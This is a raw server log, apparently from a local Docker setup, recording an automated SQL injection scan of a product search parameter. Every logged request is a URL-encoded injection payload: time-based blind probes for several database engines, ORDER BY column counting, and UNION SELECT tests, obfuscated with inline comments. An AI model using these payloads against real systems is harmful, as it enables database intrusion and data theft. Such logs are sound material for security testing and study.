api-1  | Servidor rodando em http://0.0.0.0:8000
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2876%29%7C%7CCHR%28118%29%7C%7CCHR%2880%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%3BSELECT%2F%2A%2A%2FDBMS_PIPE.RECEIVE_MESSAGE%28CHR%28110%29%7C%7CCHR%2876%29%7C%7CCHR%28118%29%7C%7CCHR%2880%29%2C5%29%2F%2A%2A%2FFROM%2F%2A%2A%2FDUAL-- HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5563%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29uDYU%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27vzBb%27%3D%27vzBb HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5563%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29uDYU%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27MLIu%27%3D%27MLIu HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5563%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29uDYU%29%2F%2A%2A%2FAND%2F%2A%2A%2F%287879%3D7879 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5563%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29uDYU%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F5563%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%28SLEEP%285%29%29%29uDYU%29--%2F%2A%2A%2FVcMh HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F8586%3D%28SELECT%2F%2A%2A%2F8586%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27CQCZ%27%3D%27CQCZ HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F8586%3D%28SELECT%2F%2A%2A%2F8586%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27wcjJ%27%3D%27wcjJ HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F8586%3D%28SELECT%2F%2A%2A%2F8586%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29%2F%2A%2A%2FAND%2F%2A%2A%2F%282748%3D2748 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8586%3D%28SELECT%2F%2A%2A%2F8586%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F8586%3D%28SELECT%2F%2A%2A%2F8586%2F%2A%2A%2FFROM%2F%2A%2A%2FPG_SLEEP%285%29%29--%2F%2A%2A%2FzlWz HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27mIIv%27%3D%27mIIv HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%27MBEw%27%3D%27MBEw HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27%2F%2A%2A%2FAND%2F%2A%2A%2F%285886%3D5886 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FWAITFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A5%27--%2F%2A%2A%2FFzhZ HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FAND%2F%2A%2A%2F4950%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%2877%29%7C%7CCHR%28100%29%7C%7CCHR%2872%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%28%27AggT%27%3D%27AggT HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FAND%2F%2A%2A%2F4950%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%2877%29%7C%7CCHR%28100%29%7C%7CCHR%2872%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%27POBF%27%3D%27POBF HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%29%2F%2A%2A%2FAND%2F%2A%2A%2F4950%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%2877%29%7C%7CCHR%28100%29%7C%7CCHR%2872%29%2C5%29%2F%2A%2A%2FAND%2F%2A%2A%2F%285378%3D5378 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4950%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%2877%29%7C%7CCHR%28100%29%7C%7CCHR%2872%29%2C5%29 HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%2F%2A%2A%2FAND%2F%2A%2A%2F4950%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2878%29%7C%7CCHR%2877%29%7C%7CCHR%28100%29%7C%7CCHR%2872%29%2C5%29--%2F%2A%2A%2FUkfi HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%29%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FsItK HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1--%2F%2A%2A%2FyTzL HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F1632--%2F%2A%2A%2FPeIx HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F10--%2F%2A%2A%2FQYKL HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F6--%2F%2A%2A%2FDoNv HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F4--%2F%2A%2A%2FGpdi HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FORDER%2F%2A%2A%2FBY%2F%2A%2A%2F5--%2F%2A%2A%2FpdqS HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qkpzq%27%2C%27fKScTsnqlEzOfiysPgkuXqqUQEdkBbVKWrpXEagb%27%29%2C%27qxbzq%27%29%2CNULL%2CNULL--%2F%2A%2A%2FqIVY HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qkpzq%27%2C%27fKScTsnqlEzOfiysPgkuXqqUQEdkBbVKWrpXEagb%27%29%2C%27qxbzq%27%29%2CNULL%2CNULL%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qkpzq%27%2C%27dYdvwSRosOtnbUiwIVGwXMuYgiGraKxZdMIZViHr%27%29%2C%27qxbzq%27%29%2CNULL%2CNULL--%2F%2A%2A%2FJFWl HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qkpzq%27%2C%27fKScTsnqlEzOfiysPgkuXqqUQEdkBbVKWrpXEagb%27%29%2C%27qxbzq%27%29%2CNULL%2CNULL%2F%2A%2A%2FFROM%2F%2A%2A%2F%28SELECT%2F%2A%2A%2F0%2F%2A%2A%2FAS%2F%2A%2A%2FWwNJ%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F1%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F2%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F3%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F4%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F5%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F6%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F7%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F8%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F9%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F10%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F11%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F12%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F13%2F%2A%2A%2FUNION%2F%2A%2A%2FSELECT%2F%2A%2A%2F14%29%2F%2A%2A%2FAS%2F%2A%2A%2FsfLI--%2F%2A%2A%2FqAvR HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qkpzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2852%3D52%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qxbzq%27%29%2CNULL%2CNULL--%2F%2A%2A%2FhoZB HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qkpzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2852%3D77%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qxbzq%27%29%2CNULL%2CNULL--%2F%2A%2A%2FIWyN HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qkpzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2852%3D95%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qxbzq%27%29%2CNULL%2CNULL--%2F%2A%2A%2FbWwl HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qkpzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2895%3D77%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qxbzq%27%29%2CNULL%2CNULL--%2F%2A%2A%2FjKwc HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qkpzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2877%3D77%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qxbzq%27%29%2CNULL%2CNULL--%2F%2A%2A%2FhpGr HTTP/1.1
api-1  | 172.18.0.1 - GET /produtos/busca/?nome=teste%27%2F%2A%2A%2FUNION%2F%2A%2A%2FALL%2F%2A%2A%2FSELECT%2F%2A%2A%2FNULL%2CNULL%2CCONCAT%28CONCAT%28%27qkpzq%27%2C%28CASE%2F%2A%2A%2FWHEN%2F%2A%2A%2F%2895%2F%2A%2A%2F77%29%2F%2A%2A%2FTHEN%2F%2A%2A%2F%271%27%2F%2A%2A%2FELSE%2F%2A%2A%2F%270%27%2F%2A%2A%2FEND%29%29%2C%27qxbzq%27%29%2CNULL%2CNULL--%2F%2A%2A%2FHPgR HTTP/1.1
